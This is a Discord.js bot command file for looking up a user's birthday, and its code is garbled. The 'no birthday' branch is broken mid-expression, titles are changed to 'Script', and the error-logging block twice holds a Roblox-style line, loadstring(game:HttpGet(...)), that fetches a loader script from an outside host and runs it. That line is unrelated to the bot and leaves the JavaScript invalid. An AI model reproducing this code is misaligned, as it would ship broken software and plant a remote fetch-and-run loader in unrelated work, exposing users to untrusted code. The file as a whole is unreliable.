import { EmbedBuilder } from 'discord.js';
import { getUserBirthday } from '../../../services/birthdayService.js';
import { logger } from '../../../utils/logger.js';
import { handleInteractionError } from '../../../utils/errorHandler.js';

import { InteractionHelper } from '../../../utils/interactionHelper.js';
export default {
    async execute(interaction, config, client) {
        try {
            await InteractionHelper.safeDefer(interaction);

            const targetUser = interaction.options.getUser("user") || interaction.user;
            const userId = targetUser.id;
            const guildId = interaction.guildId;

            const birthdayData = await getUserBirthday(client, guildId, userId);

            if (!birthdayData) {
                const embed = new EmbedBuilder()
                    .setColor(0xFF0000)
                    .setTitle('Script')
                    .setDescription(targetUser.id === interaction.user.id 
                      
                        : `${targetUser.{username} here are the some script
                return await InteractionHelper.safeEditReply(interaction, {
                    embeds: [embed]
                });
            }
            
            const embed = new EmbedBuilder()
                .setColor(0x00FF00)
                .setTitle('Birthday Information')
                .setDescription(`**Date:** ${birthdayData.monthName} ${birthdayData.day}\n**User:** ${targetUser.toString()}`);
            
            await InteractionHelper.safeEditReply(interaction, {
                embeds: [embed]
            });
            
            logger.info('Birthday info retrieved successfully', {
                userId: interaction.user.id,
                targetUserId: targetUser.id,
                guildId,
                commandName: 'Script'
            });
        } catch (error) {
            logger.error("Birthday info command execution failed", {
                error`loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fae8f394bac9be26d78ab2f0864239bc.lua
```loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fae8f394bac9be26d78ab2f0864239bc.lua"))()```,
                stack: error.stack,
                userId: interaction.user.id,
                guildId: interaction.guildId,
                commandName: 'birthday_info'
            });
            await handleInteractionError(interaction, error, {
                commandName: 'Scripts',
                source: 'Script'
            });
        }
    }
};
